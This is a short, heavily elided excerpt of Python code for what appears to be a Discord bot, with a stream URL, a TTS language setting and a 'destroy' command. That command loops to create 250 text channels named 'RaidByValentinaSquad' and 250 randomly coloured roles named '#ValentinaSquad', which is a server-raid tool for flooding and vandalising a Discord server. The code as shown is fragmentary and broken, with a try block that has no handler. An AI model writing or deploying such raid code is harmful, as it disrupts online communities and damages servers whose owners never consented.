...
stream_url = "https://www.twitch.tv/Valenksa1"
tts_language = "en"
...
async def destroy(ctx):
    ...
    try:
        ...
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="RaidByValentinaSquad")
    for _i in range(250):
        await ctx.guild.create_role(name="#ValentinaSquad", color=RandomColor())
